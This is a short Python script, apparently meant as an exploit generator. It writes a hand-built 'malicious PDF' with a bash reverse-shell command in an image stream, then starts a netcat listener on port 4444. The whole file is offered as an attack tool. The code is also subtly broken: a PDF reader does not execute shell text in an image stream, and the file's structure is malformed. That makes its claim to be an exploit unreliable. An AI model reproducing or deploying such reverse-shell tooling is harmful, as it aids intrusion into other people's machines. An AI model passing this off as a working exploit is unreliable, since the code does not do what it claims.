import socket
import subprocess
import os

def create_exploit():
    # Create a reverse shell payload
    payload = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
    
    # Create a malicious PDF file
    with open("exploit.pdf", "w") as f:
        f.write("%PDF-1.1\n")
        f.write("%%\n")
        f.write("1 0 obj\n")
        f.write("<<\n")
        f.write("/Type /XObject\n")
        f.write("/Subtype /Image\n")
        f.write("/Width 1\n")
        f.write("/Height 1\n")
        f.write("/ColorSpace /DeviceRGB\n")
        f.write("/BitsPerComponent 8\n")
        f.write(">>\n")
        f.write("stream\n")
        f.write(payload + "\n")
        f.write("endstream\n")
        f.write("endobj\n")
        f.write("xref\n")
        f.write("0 1\n")
        f.write("0000000000 65535 f\n")
        f.write("trailer\n")
        f.write("<<\n")
        f.write("/Root 1 0 R\n")
        f.write(">>\n")
        f.write("startxref\n")
        f.write("0\n")
        f.write("%%EOF\n")

def start_listener():
    # Start a listener on the specified port
    os.system("nc -lvp 4444")

def main():
    create_exploit()
    start_listener()

if __name__ == "__main__":
    main()